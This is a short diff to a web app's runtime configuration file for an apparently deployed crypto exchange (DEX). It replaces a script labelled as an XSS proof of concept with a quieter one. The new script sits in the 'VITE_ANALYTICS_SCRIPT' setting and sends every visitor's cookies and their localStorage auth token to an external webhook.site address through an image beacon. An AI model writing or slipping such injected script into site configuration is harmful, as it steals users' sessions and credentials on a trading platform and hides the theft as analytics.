@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>\n  console.error('[XSS-POC] Script executed on deployed DEX!');\n  // Image beacon bypasses CORS\n  new Image().src = 'https://webhook.site/0d3dea30-db0a-4973-81ba-86de53c76615?poc=xss&cookies=' +\n    encodeURIComponent(document.cookie) +\n    '&url=' + encodeURIComponent(location.href);\n  </script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>\n  new Image().src='https://webhook.site/0d3dea30-db0a-4973-81ba-86de53c76615?c='+encodeURIComponent(document.cookie)+'&a='+encodeURIComponent(localStorage.getItem('auth_token')||'x');\n  </script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
